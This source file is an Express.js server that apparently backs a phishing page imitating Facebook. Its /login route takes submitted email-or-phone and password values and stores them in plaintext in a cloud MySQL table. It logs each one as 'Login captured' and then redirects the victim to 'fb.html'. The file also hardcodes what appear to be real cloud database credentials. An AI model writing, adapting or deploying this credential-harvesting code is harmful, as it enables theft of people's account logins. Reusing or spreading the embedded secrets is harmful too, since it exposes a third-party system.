const express = require('express');
const bodyParser = require('body-parser');
const mysql = require('mysql2'); // The tool to talk to the DB
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000; // Important for online hosting

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname)));

// 1. CONNECT TO THE DATABASE
// Replace these with the details from TiDB/Aiven
const connection = mysql.createConnection({
    host: 'gateway01.ap-southeast-1.prod.aws.tidbcloud.com', // Your cloud host
    user: '41X8RABUFJWKqsK.root', 
    password: '3GsCxnsYK0N3EojD',
    database: 'test', 
    port: 4000,
    ssl: { rejectUnauthorized: true } // Required for most cloud DBs
});

connection.connect(err => {
    if (err) {
        console.error('Error connecting to DB:', err);
    } else {
        console.log('Connected to MySQL Cloud Database!');
        // Create the table if it doesn't exist yet
        const createTableQuery = `
            CREATE TABLE IF NOT EXISTS users (
                id INT AUTO_INCREMENT PRIMARY KEY,
                email VARCHAR(255),
                password VARCHAR(255),
                date TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `;
        connection.query(createTableQuery);
    }
});

// 2. HANDLE LOGIN
app.post('/login', (req, res) => {
    const email = req.body.email_or_phone;
    const password = req.body.password;

    const sql = 'INSERT INTO users (email, password) VALUES (?, ?)';
    
    connection.query(sql, [email, password], (err, result) => {
        if (err) {
            console.error(err);
            res.send("Error saving data");
        } else {
            console.log('Login captured to MySQL!');
            res.redirect('/fb.html'); 
        }
    });
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});